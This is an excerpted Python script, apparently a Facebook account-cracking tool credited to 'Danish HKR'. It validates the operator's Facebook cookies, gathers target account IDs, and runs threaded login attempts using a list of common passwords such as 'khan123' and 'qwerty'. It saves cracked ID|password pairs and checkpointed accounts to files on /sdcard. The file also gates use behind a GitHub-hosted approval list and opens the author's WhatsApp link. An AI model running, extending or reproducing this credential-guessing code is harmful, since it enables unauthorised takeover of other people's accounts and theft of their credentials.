#assalamowalikom OPEN source by Subm ( Danish HKR )
#Fuck MAFIA KIDZ 
...
import os,base64
os.system("xdg-open https://www.facebook.com/groups/1037553047433510/?ref=share")
...
try:
	...
	os.system('python HKR.py')
android_models=[]
try:
	xx = requests.get('https://github.com/danishhacker420/HKR/blob/main/UAGNT.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://github.com/danishhacker420/HKR/blob/main/UAGNT.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
pyt=('python3.11')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/danishhacker420/HKR/blob/main/UAGNT.txt').text
		ua=open('.bbnew.txt','w')
...
\033[1;32m 
          ...
          ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
\033[1;93m--------------------------------------------------
\033[1;37m[-] AUTHOR    :\033[1;32m DANISH HKR 
\033[1;37m[-] GITHUB    :\033[1;32m DanishHacker420
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/HKR.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/HKR.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/HKR.txt\033[0;97m')
...
def login():
    ...
    try:
        print('\n Validating cookies ... ')
        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 4.3; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://wa.me/+919466636020');menu()
		...
		with tred(max_workers=30) as AXI:	
			...
			for psx in user:
				...
				if pcs in ['1','01']:
					...
					passlist = [psx,ids,'khankhan','qwerty','57273200','59039200','Ali123','57575751','khan123','khan12345']
				if mthd in ['1','01']:
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [HKR] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [HKR-OK] %s | %s'%(ids,pas))
				open('/sdcard/HKR-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [HKR-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/HKR-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [HKR-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/HKR-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [HKR] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [HKR-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [HKR-OK] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/HKR/BRAND/blob/main/Approval.txt').text
...
\033[1;37m[-] AUTHOR    :\033[1;32m DANISH HKR 
\033[1;37m[-] GITHUB    :\033[1;32m DanishHacker420
\033[1;37m[-] WhatsApp  :\033[1;32m +919466636020  
...
==================================================   """)
  ...
  os.system('xdg-open https://wa.me/+919466636020')
  print("");time.sleep(2)
  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/danishhacker420/HKR/blob/main/Approval.txt").text
    if id in httpCaht:
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/danishhacker420/HKR/blob/main/Approval.txt').text
